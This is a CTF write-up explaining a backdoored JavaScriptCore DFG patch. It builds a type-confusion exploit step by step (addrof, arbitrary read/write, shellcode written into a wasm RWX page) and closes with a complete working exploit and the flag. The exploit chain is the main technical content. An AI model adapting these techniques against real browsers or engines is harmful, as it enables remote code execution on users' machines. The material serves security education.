## Challenge Description & Handout

`I decided that DFG wasn't fast enough.`

The challenge handout contained both the `Debug` and `Release` builds of JSC, a patch file `dfg.patch`, as well as a `README.md` containing build instructions.

## Prerequisites

This section will cover a few basic concepts that you should know before you begin, feel free to [skip this section](#patch-analysis) if you already have experience with JSC exploitation. A couple of really informative resources to get started with JSC are [this phrack paper](http://phrack.org/papers/attacking_javascript_engines.html) and [this YouTube playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjwufDsT1ntgOY9yjZgg5H_t).

### Building WebKit

It is advisable to build WebKit locally to be able to debug the challenge better, and avoid dependancy issues. Instructions for building WebKit were given in `README.md`, in the challenge handout.

```sh
git clone https://github.com/WebKit/WebKit.git
cd WebKit
git checkout c40e806df2c49dac3049825cf48251a230296c6e
patch -p1 < dfg.patch
Tools/Scripts/build-webkit --jsc-only --debug
cd WebKitBuild/Debug/bin

./jsc --useConcurrentJIT=false
```

### What are Structures?

Structures, also called Maps in v8, and Shapes in Firefox, are a method used by most modern javascript engines to speed up property access. In short, properties of objects are stored in a way similar to that of key-value pairs, within structures. These structures also specify the offset at which each property is located within the corresponding JSObject. Multiple Objects can have the same structure.

### JSObjects in JSC

A standard JSObject in JSC contains of 3 main elements:
+ JSCell Header
+ Butterfly
+ Inline properties

The `JSCell Header` contains important information about the object, the most prominent one being the StructureID - which identifies the Structure of the Object, each different type of Object contains a unique, randomized StructureID. It also contains some flags describing the object (not really relevant).

The `Butterfly` is a buffer that contains array elements at positive indices and out-of-line properties (details explained later) at negative indices. This is what the butterfly looks like: 

For example, `object[0]` would be stored at `[butterfly + 0]` and `object[1]`  at `[butterfly + 0x8]`, whereas the first out-of-line property of the object would be at `[butterfly - 0x10]` and the second at `[butterfly - 0x18]`. `[butterfly - 0x8]` contains the length of the array. This [useful resource](https://liveoverflow.com/the-butterfly-of-jsobject-browser-0x02/) might provide a better explanation about JSObjects and Butterflies in JSC.

## Patch Analysis

The given patch is pretty simple, the gist of which is as follows:

```diff
diff --git a/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp b/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp
index eaeaf85ea2..a395a979b8 100644
--- a/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp
+++ b/Source/JavaScriptCore/dfg/DFGConstantFoldingPhase.cpp
@@ -41,6 +41,8 @@
 #include "PutByIdStatus.h"
 #include "StructureCache.h"
 
+bool backdoorUsed = false;
+
 namespace JSC { namespace DFG {
 
 class ConstantFoldingPhase : public Phase {
@@ -185,7 +187,8 @@ private:
                             indexInBlock, SpecNone, AssertNotEmpty, node->origin, Edge(node->child1().node(), UntypedUse));
                     }
                 }
-                if (value.m_structure.isSubsetOf(set)) {
+                if (!backdoorUsed || value.m_structure.isSubsetOf(set)) {
+                    backdoorUsed = true;
                     m_interpreter.execute(indexInBlock); // Catch the fact that we may filter on cell.
                     node->remove(m_graph);
                     eliminated = true;

```

This patch basically inserts a backdoor into `DFGConstantFoldingPhase.cpp`, which allows you to bypass a check once. But what exactly does this do?

In short, this is a redundancy check in DFG's `ConstantFolding` phase. This optimization phase basically traverses through each node of the basic block, and finds out which nodes are redundant. The backdoor inserted allows us to remove a `CheckStructure` node without any checks. 
Now what is a `CheckStructure` node, you may ask? It is a basic sanity check during optimization, that checks whether or not an object's structure has been changed, before performing any operations on it.

Now, this may seem like a pretty obvious and easy-to-exploit bug, as it allows for an arbitrary type confusion, but it's actually fairly restricted, as the backdoor can only be triggered once. Thus you can only remove a singular `CheckStructure` node, allowing for a maximum of one vulnerable JIT function, and one singular object within that function for which there is no `CheckStructure` (multiple accesses of the same object would work, as DFG's `TypeCheckHoisting` phase would hoist all the `CheckStructure` nodes into one).

## Exploitation

Now, how do we exploit this? Well, the basic idea is to DFG JIT compile a function using an object, say `a`, of a particular structure as an argument, and then call this JITed function with another object, say `b`, of another structure as an argument. An example PoC would be: 
```js
function jit(a){
    return a[0];
}
for(let i = 0; i < 100; i++){
    jit(a);
}
jit(b);
```
In this case, assuming objects `a` and `b` are of different structures, object `b` will be assumed by the function to be of structure `a`, causing a type confusion.

So how do you exploit this? There are multiple ways to achieve arbitrary read/write primitives, and you are only limited by your own creativity. Here are a couple of the methods I found while experimenting with this challenge:

### Easiest Method : Inline property OOB access

This was the easiest method I found to exploit this challenge, and is pretty easy to understand with no prior knowledge.

In JSC, objects can have two different types of properties, in-line and out-of-line. Inline properties are defined during the creation of the object, and out-of-line properties are defined afterwards. The main difference here is that inline properties are stored in the JSObject, whereas out-of-line properties are stored in the butterfly, at negative indices. 

A JSObject in JSC generally has the following layout:
```
JSCell Header
Butterfly pointer
Inline property 1
Inline property 2
...
...
```
Also, the size of the JSObject depends on the number of inline properties. Generally, JSObjects of the same size (same number of inline properties) are allocated consecutively in memory.

An arbitrary type confusion is generally rare/infeasible in most real-world scenarios, but in this specific case it provides us with an extremely powerful primitive. A type confusion here, between two objects with a different number of inline properties, would allow us to write into the next JSObject's memory, which would give us a really easy way to achieve arbitrary r/w!

How would this look in practice? Assume we have an object `a` with inline properties `x`, `y`, and `z`, and two objects `b` and `c`, each with one inline property `x`, which are stored consecutively in memory. Now the objects would look like this in memory: 
```                                 
a:  0x0  JSCell Header               b: 0x0  JSCell Header
    0x8  Butterfly                      0x8  Butterfly
    0x10 Inline property 'x'            0x10 Inline property 'x'
    0x18 Inline property 'y'         c: 0x18 JSCell Header
    0x20 Inline property 'z'            0x20 Butterfly
                                        0x28 Inline property 'x'
```
From this diagram, it should be pretty clear that if we confuse objects `a` and `b`, accessing `a.y` and `a.z` in the JITed function should access `c`'s JSCell Header and Butterfly respectively.

Now, this is a really powerful primitive. We can easily bypass JSC's StructureID Randomization -> which is a mitigation that randomizes StructureIDs of JSObjects, so that we cannot fake objects without some form of leak (although this can be bypassed with various methods, it's always easier to get a leak). The leak can simply be obtained by accessing `a.y` in this case, which would leak `c`'s JSCell Header, which contains its StructureID.

Now on to the actual exploitation - we preferably need the ability to leak the address of any object (called an `addrof` primitive), and then arbitrary read and write. This is a bit tricky with our initial primitive (just a single JITed function), but we can escalate this to a more powerful primitive.

Take 3 objects (say `b`, `c` and `d`), with the same number of inline properties, and which are thus stored consecutively in memory, as well as the object `a` from the previous example. We can JIT compile a function to write an object to `a.z`, thus writing an object to `c`'s butterfly. What if we wrote the object `d` here? Let's see how that would look in memory:
```
c:
0x0 JSCell Header
0x8 Address of object d ---------
0x10 Inline property 'x'        |
                                |
d:                              |
0x0 JSCell Header  <-------------
0x8 Butterfly
0x10 Inline property 'x'
```

Now we don't need the JITed function anymore! Accessing `c[0]` would give us `d`'s JSCell Header, and so on. Now, we can use this to create an `addrof` primitive.

JSC has 2 types of Arrays which you will need to know about in order to understand this, which are ArrayWithDouble and ArrayWithContiguous. 

ArrayWithDouble contains raw doubles in their 64-bit form, perhaps this will illustrate this concept a bit better:
```py
In [1]: hex(struct.unpack("<Q",struct.pack("<d", 13.37))[0])
Out[1]: '0x402abd70a3d70a3d'
```

ArrayWithContiguous can contain any one of 3 datatypes, a raw pointer (or object), a double (as illustrated above), and a 32-bit signed integer. However, in order to differentiate between these 3 datatypes, it employs a concept called `NaN-boxing`. 

What this does is:
+ Store raw pointers as their original values
+ Add 2**49 to all double values
+ Set the upper 2 bytes of 32-bit signed integers to 0xfffe

This snippet from `JSCJSValue.h` might help explain this concept a bit better:
```
The top 15-bits denote the type of the encoded JSValue:
    Pointer {  0000:PPPP:PPPP:PPPP
             / 0002:****:****:****
    Double  {         ...
             \ FFFC:****:****:****
    Integer {  FFFE:0000:IIII:IIII

The scheme we have implemented encodes double precision values by performing a
64-bit integer addition of the value 2^49 to the number. After this manipulation
no encoded double-precision value will begin with the pattern 0x0000 or 0xFFFE.
Values must be decoded by reversing this operation before subsequent floating point
operations may be peformed.
32-bit signed integers are marked with the 16-bit tag 0xFFFE.
The tag 0x0000 denotes a pointer, or another form of tagged immediate. Boolean,
null and undefined values are represented by specific, invalid pointer values:

    False:     0x06
    True:      0x07
    Undefined: 0x0a
    Null:      0x02
```

From here on, I will be referring to `ArrayWithDouble` as `unboxed`, and `ArrayWithContiguous` as `boxed`, for simplicity.

Why is this useful? Well, if we can obtain a type confusion, and write an unboxed double to a boxed array, the double can actually be interpreted as a pointer! Similarly if we read a boxed pointer as part of an unboxed array, we read the pointer as a raw double, allowing us to leak said pointer.

We can use this in our previous example to obtain an `addrof` primitive, the ability to leak the address of any object. Generally, inline properties of an object are always stored as boxed pointers. Now, we know that `c`'s butterfly points to the object `d`. So `c[2]` would give us the first inline property of `d`. Now what if this inline property was an object, and `c`'s Array type was `ArrayWithDouble`, i.e was an unboxed array? Then simply setting `d.x` to an object, and accessing `c[2]` would leak the address of that object! 

Here's a small PoC of what we've accomplished so far:
```js
let a = {x: 13.37, y: 26.6, z: 13.37}
let b = {x: 13.37, 0: 13.37}
let c = {x: 27.37, 0: 13.37}
let d = {x: 27.37, 0: 13.37}

for(let i = 0; i < 100; i++){
    jit(a, {})
}
// Overwrite c's butterfly with d
jit(b, d)

// Create type confusion between d's first inline property and c's butterfly 
// -> interpret object as raw double
function addrof(obj) {
    d.x = obj
    return c[2]
}
```

From here, achieving arbitrary read and write is extremely trivial. We have object `c`'s butterfly pointing to `d`, so `c[1]` will access the butterfly. 

For arbitrary read, we can set `c[1]` to the address we want to read from, and `d[0]` will give us the required value. Similary for arbitrary write, we can set `c[1]` to the address we want to write to, and write that value to `d[0]`. Let's expand our PoC:
```js
function read(addr) {
    c[1] = addr
    return d[0]
}

function write(addr, value) {
    c[1] = addr
    d[0] = value
}
```

Now that we have arbitrary read and write, as well as a primitive to leak, the rest of the exploit is pretty easy. We can use either a JIT compiled function or a wasm function, which will both create `rwx` pages, write our own shellcode to the generated `rwx` page, then call the aforementioned function, to get code execution! 

This snippet of code will do the trick:
```js
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main
var addr_f = addrof(f)
var addr_shellcode = read(addr_f + 0x38)

let shellcode = [
    2.825563119134789e-71, 3.2060568105999132e-80,
    -2.5309726874116607e+35, 7.034840446283643e-309
]

for(var i = 0; i < shellcode.length; i++) {
    write(addr_shellcode + i*8, shellcode[i])
}
f()
```
Note: you will have to do a number of int-to-float and float-to-int conversions, but I've not included them in the snippets for the sake of clarity. My full exploit will be present at the end of this post.

The release build of the `jsc` binary was running on the server, so just giving it our exploit gives us a shell!

### Other exploit methods

I found that there were multiple other ways to exploit this while testing the challenge, all of which were more difficult/contrived than the method I used. A couple such methods were:

+ Using the type confusion to create a standard confusion between boxed and unboxed arrays, then creating `addrof` and `fakeobj` primitives to fake a JSObject and create an overlap between two JSObjects. However, a few difficulties you would face while using this method is that you would need a StructureID leak (which can be obtained using inline properties), and you would need to be able to create both primitives in a single JITed function.
+ Another more advanced version of the previous method would be to use the type confusion to write OOB into an Array's length field, thus creating an array overflow and potentially a more stable type confusion. However, you would still need a StructureID leak to exploit this.

Edit: After the CTF, I found that the majority of teams used the first of these two methods to exploit this challenge.

## Full exploit

```js
var tmp_buf = new ArrayBuffer(8)
var f64 = new Float64Array(tmp_buf)
var u32 = new Uint32Array(tmp_buf)
var BASE = 0x100000000

function f2i(f) {
    f64[0] = f
    return u32[0] + BASE*u32[1]
}
function i2f(i) {
    u32[0] = i % BASE
    u32[1] = i / BASE
    return f64[0]
}
function hex(x) {
    if (x < 0) return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function jit(a, addr) {
    a.j = addr
}

let a = {x: 13.37, y: 26.6, z: 13.37, j: 13.37}
let b = {x: 13.37, y: 26.6, 0: 13.37}
let c = {x: 27.37, y: 26.6, 0: 13.37}
let d = {x: 27.37, y: 26.6, 0: 13.37}

for(let i = 0; i < 100; i++){
    jit(a, {})
}
// Overwrite c's butterfly with d
jit(b, d)

// Create type confusion between d's first inline property and c's butterfly 
// -> interpret object as raw double
function addrof(obj) {
    d.x = obj
    return f2i(c[2])
}

// Arbitrary r/w by overwriting d's butterfly
function read(addr) {
    c[1] = i2f(addr)
    return f2i(d[0])
}

function write(addr, value) {
    c[1] = i2f(addr)
    d[0] = value
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11])
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main
var addr_f = addrof(f)
print("[*] f @ " + hex(addr_f))

var addr_shellcode = read(addr_f + 0x38)
print("[*] Shellcode @ " + hex(addr_shellcode))

let shellcode = [
    2.825563119134789e-71, 3.2060568105999132e-80,
    -2.5309726874116607e+35, 7.034840446283643e-309
]

for(var i = 0; i < shellcode.length; i++) {
    write(addr_shellcode + i*8, shellcode[i])
}

print("[*] Shellcode write done")

f()
```

## Flag
`inctf{JIT_t0o_f4st_1t_g0t_c0nfus3d}`

I hope you guys enjoyed the challenge, I learnt a lot while making it! Feel free to reach out to me on [twitter](https://twitter.com/_d4rkkn1gh7) for any questions/queries regarding this writeup.
